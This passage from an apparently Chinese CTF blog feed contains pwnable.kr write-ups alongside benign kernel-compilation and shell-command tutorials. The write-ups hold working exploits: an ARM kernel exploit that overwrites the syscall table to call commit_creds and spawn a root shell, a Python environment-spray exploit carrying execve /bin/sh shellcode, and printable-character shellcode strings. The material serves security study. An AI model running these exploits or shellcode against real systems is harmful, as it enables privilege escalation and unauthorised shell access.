<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">char cred[] = &quot;\x04\xe0\x2d\xe5\x00\x00\xa0\xe3\x40\x30\x9f\xe5\x33\xff\x2f\xe1\x04\x00\x2d\xe5\x01\x10\x41\xe0\x04\x00\x80\xe2\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x10\x80\xe4\x04\x00\x9d\xe4\x0c\x30\x9f\xe5\x33\xff\x2f\xe1\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x4c\xf4\x03\x80\x6c\xf5\x03\x80&quot;;</div><div class="line">char waa[] = &quot;\x01\x30\xd0\xe4\x01\x30\xc1\xe4\x01\x20\x52\xe2\xfb\xff\xff\xaa\x1e\xff\x2f\xe1&quot;;</div><div class="line"></div><div class="line">char addr1[] = &quot;\xfe\xca\xf5\x83&quot;;</div><div class="line">char addr2[] = &quot;\xee\xbe\xf6\x83&quot;;</div><div class="line"></div><div class="line">int ret;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r0, %1\n&quot;</div><div class="line">        &quot;mov r1, %2\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov r0, %3\n&quot;</div><div class="line">        &quot;mov r1, %4\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        : &quot;r&quot; (waa), &quot;r&quot; (0x83f5cafe),</div><div class="line">          &quot;r&quot; (addr1), &quot;r&quot; (0x8000e6c4)</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line">    printf(&quot;return value: %x\n&quot;, ret);</div><div class="line"></div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r0, %1\n&quot;</div><div class="line">        &quot;mov r1, %2\n&quot;</div><div class="line">        &quot;mov r2, %3\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov r0, %4\n&quot;</div><div class="line">        &quot;mov r1, %5\n&quot;</div><div class="line">        &quot;mov r2, %6\n&quot;</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        : &quot;r&quot; (cred), &quot;r&quot; (0x83f6beee), &quot;r&quot; (89),</div><div class="line">          &quot;r&quot; (addr2), &quot;r&quot; (0x8000e6c4), &quot;r&quot; (5),</div><div class="line">          &quot;r&quot; (0)</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;r5&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line">    printf(&quot;return value: %x\n&quot;, ret);</div><div class="line"></div><div class="line">    asm volatile (</div><div class="line">        &quot;mov r7, #223\n&quot;</div><div class="line">        &quot;svc #0\n&quot;</div><div class="line">        &quot;mov %0, r0&quot;</div><div class="line">        : &quot;=r&quot; (ret)</div><div class="line">        :</div><div class="line">        : &quot;r0&quot;, &quot;r1&quot;, &quot;r3&quot;, &quot;lr&quot;</div><div class="line">    );</div><div class="line"></div><div class="line">    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>参考: <a href="http://w0lfzhang.me/2017/04/27/pwnable-syscall/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/27/pwnable-syscall/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">//gcc -o solver solver.c -std=c99</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define SYS_CALL_TABLE 0x8000e348</div><div class="line">#define PREPARE_KERNEL_CRED 0x8003f924</div><div class="line">//0x8003f56c  &apos;6c&apos; is low_case, so adding padding to &apos;60&apos;</div><div class="line">#define COMMIT_CREDS 0x8003f560</div><div class="line">#define SYS_EMPTY_A 188</div><div class="line">#define SYS_EMPTY_B 189</div><div class="line">int main() &#123;</div><div class="line">    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;</div><div class="line">    char nop[] = &quot;\x01\x10\xa0\xe1&quot;;  //rasm2 -a arm &apos;mov r1,r1&apos;</div><div class="line">    char buf[20];</div><div class="line">    for (int i = 0; i &lt; 12; i++) &#123;</div><div class="line">        buf[i] = nop[i % 4];</div><div class="line">    &#125;</div><div class="line">    buf[12] = 0;</div><div class="line">    syscall(223, buf, COMMIT_CREDS);</div><div class="line">    puts(&quot;Stage 1 - add padding&quot;);</div><div class="line">    syscall(223, &quot;\x24\xf9\x03\x80&quot;, sct + SYS_EMPTY_A);</div><div class="line">    syscall(223, &quot;\x60\xf5\x03\x80&quot;, sct + SYS_EMPTY_B);</div><div class="line">    puts(&quot;Stage 2 - overwrite syscall table&quot;);</div><div class="line">    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));</div><div class="line">    puts(&quot;Stage 3 - set new cred&quot;);</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> kernel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux内核编译]]></title>
      <url>/2017/10/14/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>Linux内核是操作系统的核心，也是操作系统最基本的部分。</p>
<p>Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需 要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。<br><strong>注意：如果两个内核模块的版本不完全相同是不可以跨版本使用的。</strong></p>
<h3 id="1、编译内核"><a href="#1、编译内核" class="headerlink" title="1、编译内核"></a>1、编译内核</h3><h4 id="1-1-下载并解压内核文件"><a href="#1-1-下载并解压内核文件" class="headerlink" title="1.1 下载并解压内核文件"></a>1.1 下载并解压内核文件</h4><p> 首先我们要去获得Linux内核的压缩文件、获得的路径很多了、最直接的就是去内核官网获得了(<a href="http://www.kernel.org)，也可以到各镜像站上去下载。此处使用的是[https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz](https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz)" target="_blank" rel="external">http://www.kernel.org)，也可以到各镜像站上去下载。此处使用的是[https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz](https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz)</a></p>
<p><strong>注意：一般而言，需要编译的linux内核的源码放在/usr/src目录下。</strong></p>
<blockquote>
<p>wget <a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.gz" target="_blank" rel="external">https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.gz</a><br>sudo tar -zxvf linux-3.16.tar.gz -C /usr/src/</p>
</blockquote>
<h4 id="1-2-编译前准备"><a href="#1-2-编译前准备" class="headerlink" title="1.2 编译前准备"></a>1.2 编译前准备</h4><p>需要确保系统安装了gcc，ncurses，bc，make，并且系统包需要更新到最新版</p>
<blockquote>
<p>sudo apt-get install gcc<br>sudo apt-get install libncurses5-dev<br>sudo apt-get update<br>sudo apt-get upgrade<br>sudo apt-get install make<br>sudo apt-get install bc</p>
</blockquote>
<h4 id="1-3-配置内核"><a href="#1-3-配置内核" class="headerlink" title="1.3 配置内核"></a>1.3 配置内核</h4><p>方法很多，比较常用的是</p>
<blockquote>
<p>make menuconfig</p>
<p>make</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">make config：遍历选择所要编译的内核特性</div><div class="line">make allyesconfig：配置所有可编译的内核特性</div><div class="line">make allnoconfig：并不是所有的都不编译，而是能选的都回答为NO、只有必须的都选择为yes。</div><div class="line">make menuconfig：这种就是打开一个文件窗口选择菜单，这个命令需要打开的窗口大于80字符的宽度，打开后就可以在里面选择要编译的项了</div><div class="line"></div><div class="line">下面两个是可以用鼠标点选择的，比较方便：</div><div class="line">make kconfig(KDE桌面环境下，并且安装了qt开发环境)</div><div class="line">make gconfig(Gnome桌面环境，并且安装gtk开发环境)</div><div class="line"></div><div class="line">make menuconfig：使用这个命令的话，如果是新安装的系统就要安装gcc和ncurses-devel这两个包才可以打开，然后在里面选择就可以了。此方法使用较多</div></pre></td></tr></table></figure>
<h4 id="1-4-安装或更新内核"><a href="#1-4-安装或更新内核" class="headerlink" title="1.4 安装或更新内核"></a>1.4 安装或更新内核</h4><blockquote>
<p>make modules_install install</p>
</blockquote>
<p>如果/boot目录下有下面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.map-3.16.0</div><div class="line">vmlinuz-3.16.0</div><div class="line">initrd.img-3.16.0</div><div class="line">config-3.16.0</div></pre></td></tr></table></figure>
<p>代表已经成功编译了。</p>
<p>重启系统</p>
<blockquote>
<p> shutdown -r now</p>
</blockquote>
<h4 id="1-5-验证"><a href="#1-5-验证" class="headerlink" title="1.5 验证"></a>1.5 验证</h4><blockquote>
<p> uname -r</p>
</blockquote>
<p>查看内核是否发生改变</p>
<h3 id="2、-向内核中添加自定义的syscall函数"><a href="#2、-向内核中添加自定义的syscall函数" class="headerlink" title="2、 向内核中添加自定义的syscall函数"></a>2、 向内核中添加自定义的syscall函数</h3><p>这部分参考的是文章 <a href="https://tssurya.wordpress.com/2014/08/19/adding-a-hello-world-system-call-to-linux-kernel-3-16-0/" target="_blank" rel="external">Adding a Hello World System Call to Linux kernel 3.16.0</a></p>
<h4 id="2-1-下载并解压内核文件"><a href="#2-1-下载并解压内核文件" class="headerlink" title="2.1 下载并解压内核文件"></a>2.1 下载并解压内核文件</h4><h4 id="2-2-定义新的系统函数sys-hello"><a href="#2-2-定义新的系统函数sys-hello" class="headerlink" title="2.2 定义新的系统函数sys_hello"></a>2.2 定义新的系统函数sys_hello</h4><p>a) 创建hello.c文件</p>
<blockquote>
<p>cd /usr/src/linux-3.16</p>
<p>mkdir hello</p>
<p>cd hello</p>
<p>vim hello.c</p>
</blockquote>
<p>/usr/src/linux-3.16/hello/hello.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        printk(<span class="string">"Hello world\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>b) 创建Makefile</p>
<blockquote>
<p>vim Makefile</p>
</blockquote>
<p>/usr/src/linux-3.16/hello/Makefile</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">obj-y := hello.o</div></pre></td></tr></table></figure>
<p>c) 修改内核的Makefile</p>
<p>修改linux-3.16文件目录下的Makefile，将842行的&quot;<em>core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/</em> &quot;</p>
<p>修改为&quot;<em>core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ hello/</em>&quot;</p>
<p>d) 修改syscall_32.tbl文件（如果是64位系统，就应该修改syscall\_64.tbl）</p>
<blockquote>
<p><em>cd arch/x86/syscalls</em></p>
<p>vim syscall_32.tbl</p>
</blockquote>
<p>在接近末尾处，添加一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">354    i386    hello    sys_hello</div></pre></td></tr></table></figure>
<p>其中354指的是系统调用号，i386指的是系统类型，sys_hello指的是系统函数</p>
<p>e) 修改对应的头文件syscalls.h</p>
<blockquote>
<p><em>cd  include/linux/</em></p>
<p>vim syscalls.h</p>
</blockquote>
<p>在末尾处，添加一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">asmlinkage long sys_hello(void);</div></pre></td></tr></table></figure>
<h4 id="2-3-编译前准备"><a href="#2-3-编译前准备" class="headerlink" title="2.3 编译前准备"></a>2.3 编译前准备</h4><h4 id="2-4-配置内核"><a href="#2-4-配置内核" class="headerlink" title="2.4 配置内核"></a>2.4 配置内核</h4><h4 id="2-5-安装或更新内核"><a href="#2-5-安装或更新内核" class="headerlink" title="2.5 安装或更新内核"></a>2.5 安装或更新内核</h4><h4 id="2-6-检验系统调用函数是否成功编译"><a href="#2-6-检验系统调用函数是否成功编译" class="headerlink" title="2.6 检验系统调用函数是否成功编译"></a>2.6 检验系统调用函数是否成功编译</h4><p>随便写一个test.c文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">         <span class="keyword">long</span> <span class="keyword">int</span> amma = syscall(<span class="number">354</span>);</div><div class="line">         <span class="built_in">printf</span>(<span class="string">"System call sys_hello returned %ld\n"</span>, amma);</div><div class="line">         <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果内核编译正确的话，程序返回的是&quot;<em>System call sys_hello returned 0</em>&quot;</p>
<p>通过dmesg命令可以查看内核信息，发现&quot;Hello world&quot;</p>
]]></content>
      
        <categories>
            
            <category> 编译原理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> kernel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[程序执行中我们所忽略的事]]></title>
      <url>/2017/10/01/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E4%B8%AD%E6%88%91%E4%BB%AC%E6%89%80%E5%BF%BD%E7%95%A5%E7%9A%84%E4%BA%8B/</url>
      <content type="html"><![CDATA[<h4 id="1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？"><a href="#1、程序执行时argv-0-一定会是程序名或者程序绝对路径吗？" class="headerlink" title="1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？"></a>1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？</h4><p>这个问题可能让绝大多数人困惑，因为我们所看到的基本上都符合这个结论。那什么情况下不符合呢？</p>
<p>这就不得不提到我做过的pwnable.kr上的tiny_easy一题了</p>
<blockquote>
<p>I made a pretty difficult pwn task.<br>However I also made a dumb rookie mistake and made it too easy :(<br>This is based on real event :) enjoy.</p>
<p>ssh <a href="mailto:tiny_easy@pwnable.kr" target="_blank" rel="external">tiny_easy@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>程序主体就一下几行:</p>
<blockquote>
<p>pop     eax<br>pop     edx<br>mov     edx, [edx]<br>call    edx</p>
</blockquote>
<p>那么eax其实是参数个数，而edx则是argv[0]所在字符串的前4位组成的32位地址</p>
<p><strong>exp.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">jumpto = <span class="string">"\xb0\xaf\xb5\xff"</span></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></div><div class="line">nopsled = <span class="string">"\x90"</span>*<span class="number">4096</span>;</div><div class="line">payload = nopsled+shellcode</div><div class="line"></div><div class="line">myenv = &#123;&#125;</div><div class="line"><span class="comment"># Arbitrary largeish number</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">    myenv[<span class="string">"spray"</span>+str(i)] = payload</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    p = subprocess.Popen([jumpto], executable=<span class="string">"tiny_easy"</span>, env=myenv)</div><div class="line">    p.wait()</div></pre></td></tr></table></figure>
<p>脚本很简单，利用的是类堆喷的方法。</p>
<p>这里subprocess.Popen(args, executable=None, env=None)</p>
<p>其实args这个list中的第一个参数是argv[0]，而执行的程序则是executable对应的elf文件。可以发现<font color="#f00">用户可以控制程序执行时argv[0]</font></p>
<p>当然除了subprocess有这个功能，pwntools中pwnlib.tubes.process.process(<em>args</em>, <em>shell = False</em>, <em>executable = None</em>, <em>env = None</em>, <em>timeout = &#39;default&#39;</em>, <em>log_level = INFO</em>)也可以有类似的操作</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[shell命令解析]]></title>
      <url>/2017/09/30/shell%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>此标题范围广，内容多，不易梳理清楚。本人也因为能力有限，不可能面面俱到，只能讲讲在ctf中可能会遇到的一些命令。</p>
<h3 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1. checksec"></a>1. checksec</h3><p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ checksec tiny_easy</div><div class="line">[*] &apos;/tmp/tiny_easy&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<h3 id="2-ldd"><a href="#2-ldd" class="headerlink" title="2. ldd"></a>2. ldd</h3><p>用来查看程序运行所需的共享库,常用来解决程序因缺少某个库文件而不能运行的一些问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ldd ascii_easy</div><div class="line">	linux-gate.so.1 =&gt;  (0xf7765000)</div><div class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7591000)</div><div class="line">	/lib/ld-linux.so.2 (0x56565000)</div></pre></td></tr></table></figure>
<h3 id="3-export"><a href="#3-export" class="headerlink" title="3. export"></a>3. export</h3><p>设置全局变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ export PATH=/tmp/test:$PATH</div><div class="line">$ echo $PATH      # 输出某个全局变量，没有的话就输出一行空串</div><div class="line">$ env     # 查看所有全局变量</div><div class="line">$ set     # 显示所有本地定义的Shell变量</div><div class="line">$ unset PATH     # 清除环境变量</div></pre></td></tr></table></figure>
<p>export是设置的临时全局变量，在关闭shell之后就自动清除了；</p>
<p>而如果修改文件/etc/bashrc和/etc/profile，那这个改变就会是永久的。</p>
<h3 id="4-ldconfig"><a href="#4-ldconfig" class="headerlink" title="4. ldconfig"></a>4. ldconfig</h3><p>ldconfig是一个动态链接库管理命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ export LD_LIBRARY_PATH=/tmp/test</div><div class="line">$ ldconfig</div><div class="line">$ ldd ascii_easy</div></pre></td></tr></table></figure>
<p>最后没有正确链接上，可能的原因是因为本机与那个动态链接库不兼容导致！</p>
<h3 id="5-strace"><a href="#5-strace" class="headerlink" title="5. strace"></a>5. strace</h3><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">-c 统计每一系统调用的所执行的时间,次数和出错的次数等. </div><div class="line">-d 输出strace关于标准错误的调试信息. </div><div class="line">-f 跟踪由fork调用所产生的子进程. </div><div class="line">-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. </div><div class="line">-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. </div><div class="line">-h 输出简要的帮助信息. </div><div class="line">-i 输出系统调用的入口指针. </div><div class="line">-q 禁止输出关于脱离的消息. </div><div class="line">-r 打印出相对时间关于,,每一个系统调用. </div><div class="line">-t 在输出中的每一行前加上时间信息. </div><div class="line">-tt 在输出中的每一行前加上时间信息,微秒级. </div><div class="line">-ttt 微秒级输出,以秒了表示时间. </div><div class="line">-T 显示每一调用所耗的时间. </div><div class="line">-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. </div><div class="line">-V 输出strace的版本信息. </div><div class="line">-x 以十六进制形式输出非标准字符串 </div><div class="line">-xx 所有字符串以十六进制形式输出. </div><div class="line">-a column  设置返回值的输出位置.默认 为40. </div><div class="line">-e expr 指定一个表达式,用来控制如何跟踪.格式如下: </div><div class="line">[qualifier=][!]value1[,value2]...  qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如: </div><div class="line">-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\. </div><div class="line">-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all. </div><div class="line">-e trace=file 只跟踪有关文件操作的系统调用. </div><div class="line">-e trace=process 只跟踪有关进程控制的系统调用. </div><div class="line">-e trace=network 跟踪与网络有关的所有系统调用. </div><div class="line">-e strace=signal 跟踪所有与系统信号有关的 系统调用 </div><div class="line">-e trace=ipc 跟踪所有与进程通讯有关的系统调用 </div><div class="line">-e abbrev=set 设定 strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all. </div><div class="line">-e raw=set 将指 定的系统调用的参数以十六进制显示. </div><div class="line">-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号. </div><div class="line">-e read=set 输出从指定文件中读出 的数据.例如: </div><div class="line">-e read=3,5 -e write=set 输出写入到指定文件中的数据. </div><div class="line">-o filename 将strace的输出写入文件filename </div><div class="line">-p pid 跟踪指定的进程pid. </div><div class="line">-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出. </div><div class="line">-u username 以username 的UID和GID执行被跟踪的命令</div></pre></td></tr></table></figure>
<p>strace -if elfname   一般而言会返回   execve(elf绝对路径， elf绝对路径，其他)</p>
<p>但是，如果elf所在目录被加入PATH全局变量，返回的就是  execve(elf绝对路径， elfname，其他)</p>
<p>也就是说，后一种直接用文件名就可执行！</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[全是可见字符的shellcode]]></title>
      <url>/2017/09/30/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/</url>
      <content type="html"><![CDATA[<p>最近做了pwnable.kr上的一道题，收获颇丰！其中就有对全是可见字符组成的shellcode的总结，也就是本文。</p>
<h3 id="全是可见字符的shellcode"><a href="#全是可见字符的shellcode" class="headerlink" title="全是可见字符的shellcode"></a>全是可见字符的shellcode</h3><blockquote>
<p>shellcode1: PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx</p>
<p>shellcode2: PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA</p>
</blockquote>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>首先写一个test.c文件:</p>
